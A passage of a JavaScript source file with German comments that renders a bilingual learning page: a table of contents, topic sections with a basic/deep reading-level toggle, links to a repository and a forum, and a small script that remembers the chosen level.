   * mich die Pruefung fuer bestanden halten lassen.
   */

  const verzeichnis = `
<nav class="wegweiser" aria-label="${t.tocLabel}">
  <span class="wegweiser-titel">${t.tocTitle}</span>
  <ol>
    ${[
      ...t.topics.map((topic) => [topic.n, topic.h]),
      /*
       * Die letzten beiden Abschnitte stehen nicht in `topics`, sondern als
       * feste Bloecke am Seitenende — sie sind trotzdem Abschnitte dieser
       * Seite. Ohne sie zaehlte das Verzeichnis fuenf, waehrend sieben
       * Ueberschriften da sind, und behauptete damit, die Seite ende frueher.
       * Ein unvollstaendiges Verzeichnis ist schlechter als gar keins.
       *
       * Sie tragen keine Nummer, weil sie keine Lernabschnitte sind: der eine
       * ist der naechste Schritt, der andere die Hilfe.
       */
      ['', t.ctaH],
      ['', t.askH],
    ].map(([n, h]) => `<li><a href="#${slugify(h)}">
      <span class="wegweiser-n">${n || '·'}</span>${h}</a></li>`).join('')}
  </ol>
</nav>`;

  const topics = t.topics
    .map(
      (topic) => `
<article class="stack" style="padding-block:clamp(28px,4vw,44px);border-top:1px solid var(--border)">
  <span class="eyebrow">${topic.n}</span>
  <h2>${topic.h}</h2>
  <div class="lvl basic on narrow stack">${topic.basic}</div>
  <div class="lvl deep narrow stack">${topic.deep}</div>
</article>`,
    )
    .join('');

  return `
<section class="hero hero-stage" style="padding-bottom:20px">
  <div class="wrap stack">
    <span class="eyebrow">${t.eyebrow}</span>
    <h1>${t.h1}</h1>
    <p class="lede">${t.lede}</p>
    <div class="btn-row" style="margin-top:1.4rem">
      <div class="level-toggle" role="group" aria-label="${t.toggleLabel}">
        <button type="button" data-level="basic" aria-pressed="true">${t.basic}</button>
        <button type="button" data-level="deep" aria-pressed="false">${t.deep}</button>
      </div>
    </div>
    ${verzeichnis}
  </div>
</section>

<section style="padding-top:0">
  <div class="wrap">${topics}</div>
</section>

<hr class="divider">

<section>
  <div class="wrap grid grid-2">
    <div class="stack">
      <h2>${t.ctaH}</h2>
      <p class="muted">${t.ctaP}</p>
      <div class="btn-row">
        <a class="btn btn-primary" href="${SITE.repoAirlock}">${t.ctaBtn}</a>
        <a class="btn" href="${href(lang, 'skills')}">${t.ctaAlt}</a>
      </div>
    </div>
    <div class="stack">
      <h2>${t.askH}</h2>
      <p class="muted">${t.askP}</p>
      <div class="btn-row"><a class="btn" href="${href(lang, 'forum')}">${t.askBtn}</a></div>
    </div>
  </div>
</section>
`;
}

export const script = () => `
(function () {
  var buttons = [].slice.call(document.querySelectorAll('.level-toggle button'));
  if (!buttons.length) return;

  function set(level) {
    buttons.forEach(function (b) { b.setAttribute('aria-pressed', String(b.dataset.level === level)); });
    [].forEach.call(document.querySelectorAll('.lvl'), function (el) {
      el.classList.toggle('on', el.classList.contains(level));
    });
    try { localStorage.setItem('level', level); } catch (e) {}
  }

  buttons.forEach(function (b) { b.addEventListener('click', function () { set(b.dataset.level); }); });

  // Remember the depth someone picked; they rarely want the other one next time.
  try {
    var saved = localStorage.getItem('level');
    if (saved === 'deep' || saved === 'basic') set(saved);
  } catch (e) {}
})();`;

/**
 * Wie viele Themen der Lernbereich hat — fuer die Tuer auf der Startseite.
 * Aus den Daten, nicht aus einem gepflegten Satz; beide Sprachen haben per
 * Bauart dieselbe Anzahl, gezaehlt wird die englische.
 */
export const N_THEMEN = T.en.topics.length;
